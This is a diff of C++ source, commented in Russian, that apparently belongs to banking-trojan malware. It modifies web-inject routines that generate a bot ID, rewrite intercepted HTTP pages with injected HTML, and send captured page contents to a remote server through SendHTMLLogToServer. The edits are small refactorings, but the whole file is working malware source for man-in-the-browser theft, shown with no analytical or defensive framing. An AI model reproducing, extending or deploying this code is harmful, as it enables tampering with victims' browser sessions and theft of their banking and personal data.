@@ -861,18 +861,21 @@ bool InjectHTMLCode(PRequest Request, THTMLInject *Inject)
 	DWORD Count = Inject->Count();
 	bool Injected; // Признак того, что был произведён хотя-бы один инжект
 
+
+
 	PCHAR BotID = GenerateBotID();
+
+    THTMLInjectData Data(NULL);
 
 	for (DWORD i = 0; i < Count; i++)
 	{
-		THTMLInjectData *SourceData = Inject->Items(i);
+	   	THTMLInjectData *SourceData = Inject->Items(i);
 
 		// Отключенные данные игнорируем
 		if (SourceData->Disabled) continue;
 
 		// Перед инжектом копируем данные, т.к. некоторые
 		// инжекты могут содержать макросы подмены
-		THTMLInjectData Data(NULL);
 		Data.Copy(*SourceData);
 
 		#ifdef BV_APP
@@ -885,7 +888,7 @@ bool InjectHTMLCode(PRequest Request, THTMLInject *Inject)
 		NewBuffer = NULL;
 		NewLen    = 0;
 
-		if (Data.MacrosHash == 0)
+	   	if (Data.MacrosHash == 0)
 		{
 			Data.MacrosHash = Data.Before.Hash();
 			SourceData->MacrosHash = Data.MacrosHash;
@@ -963,11 +966,14 @@ bool HTMLInjects::Execute(PRequest Request, PHTTPSessionInfo Session) {
 	Request->Injected = true; // Устанавливаем признак обработанных инжектов
 
 	bool Result = false;
-	THTMLInject *Inject;
 	DWORD Count = List::Count(Request->Injects);
 
-	for (DWORD i = 0; i < Count; i++) {
-		Inject = (THTMLInject*)List::GetItem(Request->Injects, i);
+	for (DWORD i = 0; i < Count; i++)
+	{
+		THTMLInject *Inject = (THTMLInject*)List::GetItem(Request->Injects, i);
+
+		Inject->CallEvent(BOT_EVENT_HTMLINJECT_EXECUTE);
+
 		if (Inject->IsLog)
 			SendHTMLLogToServer((PCHAR)Request->Buffer, Inject, Session);
 		else
@@ -1034,11 +1040,14 @@ THTMLInjectList::THTMLInjectList()
 {
 	// Включаем потоко-защищённый режим
 	SetThreadSafe();
+	Variables = new TValues();
+    Variables->SetThreadSafe();
+
 }
 
 THTMLInjectList::~THTMLInjectList()
 {
-
+	delete Variables;
 }
 
 
